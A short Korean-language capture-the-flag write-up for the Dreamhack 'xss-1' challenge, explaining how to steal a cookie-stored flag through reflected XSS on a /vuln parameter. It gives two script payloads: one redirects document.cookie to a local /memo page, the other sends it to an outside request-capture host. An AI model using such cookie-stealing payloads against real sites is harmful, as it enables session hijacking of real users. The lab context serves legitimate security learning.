# xss-1 (28)

## 문제

https://dreamhack.io/wargame/challenges/28

## 풀이

FLAG 변수를 따라가 보면 /flag path의 POST method에서 값을 얻을 수 있다.

이 값을 read_url함수에서 cookie에 저장한 후, /vuln path에서 query parameter를 return한다.

방법 1.

/memo path를 보면 memo query값을 가져와서 text에 추가하고 접속하면 보여주게 된다.

따라서 /flag path의 query string에 [memo query에 cookie를 넣고 /memo로 이동하는] 스크립트를 추가해서 POST를 날리면 된다.

- POST 명령을 날릴 수 있도록 버튼이 준비되어 있다.
```
http://127.0.0.1:8000/vuln?param=<script>location.href="/memo?memo="+document.cookie</script>
```

- 실행 화면  
![image](https://github.com/GwangIl-Park/dreamhack-playground/assets/40749130/552786c0-816c-44e6-8ea0-7508daf2423f)

- /memo path에서 DH 확인 가능  
![image](https://github.com/GwangIl-Park/dreamhack-playground/assets/40749130/44778022-f630-4d6c-a4c4-de7848d4ce4b)

방법 2.

서버를 띄워놓고 location.href에 서버 url을 넣어준다.

```
http://127.0.0.1:8000/vuln?param=<script>location.href="https://ymupogv.request.dreamhack.games/?flag="+document.cookie</script>
```

- 서버는 dreamhack에서 제공하는 tool을 사용했다.
![image](https://github.com/GwangIl-Park/dreamhack-playground/assets/40749130/1dd25ca4-ea8c-4644-a747-581984083c39)